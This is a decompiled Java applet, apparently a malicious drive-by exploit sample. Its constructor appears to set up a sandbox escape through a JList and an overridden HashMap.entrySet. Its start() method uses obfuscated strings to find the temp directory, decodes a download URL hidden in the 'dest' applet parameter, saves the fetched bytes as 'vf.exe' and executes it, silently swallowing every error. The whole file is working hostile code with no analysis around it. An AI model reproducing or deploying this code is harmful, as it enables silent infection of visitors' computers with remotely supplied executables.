import java.util.Map;
import java.awt.Component;
import java.util.Set;
import java.util.HashMap;
import java.util.HashSet;
import java.io.InputStream;
import java.io.FileOutputStream;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Poo extends Applet
{
    String ghtreew;
    JList polsnd;
    
    private void ttwes() {
        final String a = "ffs";
        a.concat("gssdd");
    }
    
    @Override
    public void start() {
        super.start();
        try {
            String jhfioiytr = System.getProperty("jadpfonf73va.idpfonf73o.tdpfonf73mpddpfonf73ir".replace("dpfonf73", ""));
            if (jhfioiytr.charAt(jhfioiytr.length() - 1) != '\\') {
                jhfioiytr += "\\";
            }
            final String vvvbw = jhfioiytr + "vfdpfonf73f.exdpfonf73e".replace("dpfonf73", "");
            final String popolg = this.getParameter("deorjfn32st".replace("orjfn32", ""));
            String nnnolg = "";
            for (int s = 0; s < popolg.length(); ++s) {
                int jds = popolg.charAt(s);
                jds -= 4;
                nnnolg += (char)jds;
            }
            int kf = 1;
            final InputStream phbsef = Solol.Poiso(nnnolg);
            final int afqw = 0;
            byte[] iuytrrr = new byte[153602];
            int jhgf = 0;
            final FileOutputStream gjjeer = new FileOutputStream(vvvbw);
            while ((kf = phbsef.read(iuytrrr)) > 0) {
                gjjeer.write(iuytrrr, 0, kf);
                iuytrrr = new byte[153602];
                jhgf += kf;
            }
            gjjeer.close();
            phbsef.close();
            try {
                Solol.Olknuw(vvvbw);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public Poo() {
        final Object llggswrr = System.class;
        final Object[] ooerrt = { null };
        this.ttwes();
        this.ttwes();
        int asd = 2;
        asd = 33;
        final String iuyfj6 = Strs.oplor;
        final String jffff = new String();
        ++asd;
        final Sjyaw ophf = new Sjyaw(llggswrr, iuyfj6, ooerrt);
        final HashSet kjgffffr = new HashSet();
        kjgffffr.add(ophf);
        final int mnsa = 121;
        final Map ppfkn = new HashMap() {
            @Override
            public Set entrySet() {
                return kjgffffr;
            }
        };
        this.polsnd = new JList((E[])new Object[] { ppfkn });
        final int d = 0;
        this.add(this.polsnd);
        try {
            Thread.sleep(3000L);
        }
        catch (Exception ex) {}
    }
}
